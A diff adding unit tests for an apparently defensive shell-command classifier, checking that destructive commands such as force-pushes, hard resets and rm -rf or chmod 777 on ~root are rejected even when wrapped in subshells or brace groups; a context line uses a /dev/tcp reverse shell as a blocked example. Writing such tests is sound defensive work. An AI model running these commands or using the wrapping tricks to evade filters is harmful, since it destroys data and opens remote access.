@@ -1181,6 +1181,50 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("subshell-grouped git invocation (round 10)", () => {
+    test("(git reset --hard HEAD~1) is rejected (leading paren)", () => {
+      expect(classifyCommand("(git reset --hard HEAD~1)").ok).toBe(false);
+    });
+
+    test("(git push --force origin main) is rejected", () => {
+      expect(classifyCommand("(git push --force origin main)").ok).toBe(false);
+    });
+
+    test("{ git reset --hard HEAD~1; } brace-group is rejected", () => {
+      expect(classifyCommand("{ git reset --hard HEAD~1; }").ok).toBe(false);
+    });
+
+    test("!git push --force is rejected (bang prefix)", () => {
+      expect(classifyCommand("!git push --force origin main").ok).toBe(false);
+    });
+
+    test("(git status) benign subshell still allowed", () => {
+      expect(classifyCommand("(git status)").ok).toBe(true);
+    });
+  });
+
+  describe("tilde-user expansion on system paths (round 10)", () => {
+    test("rm -rf ~root is rejected (expands to /root)", () => {
+      expect(classifyCommand("rm -rf ~root").ok).toBe(false);
+    });
+
+    test("chmod -R 777 ~root is rejected", () => {
+      expect(classifyCommand("chmod -R 777 ~root").ok).toBe(false);
+    });
+
+    test("rm -rf ~www-data is rejected", () => {
+      expect(classifyCommand("rm -rf ~www-data").ok).toBe(false);
+    });
+
+    test("chown -R nobody ~root is rejected", () => {
+      expect(classifyCommand("chown -R nobody ~root").ok).toBe(false);
+    });
+
+    test("rm -rf ~user/subdir is rejected (user home subpath)", () => {
+      expect(classifyCommand("rm -rf ~user/subdir").ok).toBe(false);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
